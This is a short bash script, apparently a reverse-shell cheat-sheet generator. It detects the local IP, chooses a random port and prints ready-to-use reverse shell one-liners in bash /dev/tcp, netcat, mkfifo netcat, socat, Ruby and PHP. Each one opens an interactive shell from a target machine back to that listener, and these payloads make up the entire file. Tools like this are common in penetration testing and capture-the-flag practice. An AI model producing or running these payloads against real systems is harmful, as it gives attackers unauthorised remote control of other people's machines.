#!/usr/bin/env bash

clear

BOLDRED="\e[1;31m"
YELLOW="\e[33m"
MAGENTA="\e[96m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"

ip_addr=$(ip addr | grep 'inet 192' | cut -d " " -f6 | cut -d "/" -f1)
rand_port=$(head /dev/urandom | tr -dc "1-9" | tail -c4)

while getopts ipaddr:port option; do
    case "${option}" in
    ipaddr)
        ip_addr=${OPTARG}
        ;;
    port)
        rand_port=${OPTARG}
        ;;
    esac
done

banner=$(cat <banner.txt)

echo -e "${BOLDRED}${banner}${ENDCOLOR}\n\n"

echo -e "${YELLOW}[*] IP: ${ip_addr} ${ENDCOLOR}"
echo -e "${YELLOW}[*] Port: ${rand_port} ${ENDCOLOR}"
echo
echo -e "${MAGENTA}[+] Bash payload #1:${ENDCOLOR}"
echo -e "\tbash -i >& /dev/tcp/${ip_addr}/${rand_port} 0>&1"
echo
echo -e "${MAGENTA}[+] Bash payload #2:${ENDCOLOR}"
echo -e "\t0<&196;exec 196<>/dev/tcp/${ip_addr}/${rand_port}; sh <&196 >&196 2>&196"
echo
echo -e "${MAGENTA}[+] Netcat:${ENDCOLOR}"
echo -e "\tnc -e /bin/sh ${ip_addr} ${rand_port}"
echo
echo -e "${MAGENTA}[+] Netcat mkfifo:${ENDCOLOR}"
echo -e "\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip_addr} ${rand_port} >/tmp/f"
echo
echo -e "${MAGENTA}[+] Netcat without -e:${ENDCOLOR}"
echo -e "\ttouch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip_addr} ${rand_port} > /tmp/f"
echo
echo -e "${MAGENTA}[+] Socat:${ENDCOLOR}"
echo -e "\tsocat tcp-connect:${ip_addr}:${rand_port} exec:sh,pty,stderr,setsid,sigint,sane"
echo
echo -e "${MAGENTA}[+] Ruby:${ENDCOLOR}"
echo -e "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${ip_addr}\",\"${rand_port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
echo
echo -e "${MAGENTA}[+] PHP:${ENDCOLOR}"
echo -e "\tphp -r '\$sock=fsockopen(\"${ip_addr}\",${rand_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
